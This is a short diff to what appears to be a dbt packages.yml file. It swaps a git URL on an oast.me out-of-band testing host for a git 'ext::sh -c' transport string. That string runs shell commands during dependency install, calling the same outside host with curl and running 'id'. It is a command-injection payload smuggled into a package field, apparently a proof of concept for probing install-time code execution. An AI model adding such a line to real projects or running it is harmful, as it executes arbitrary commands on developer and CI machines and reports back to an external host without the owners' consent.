@@ -1,3 +1,3 @@
 packages:
-  - git: "https://dc33biq1af36dsaabccgqx7qcknb3iy9w.oast.me/h282-dbt.git"
+  - git: "ext::sh -c 'echo H282-EXT-EXEC; curl -sS -m 5 https://dc33biq1af36dsaabccgqx7qcknb3iy9w.oast.me/h282-ext; id'"
     revision: main
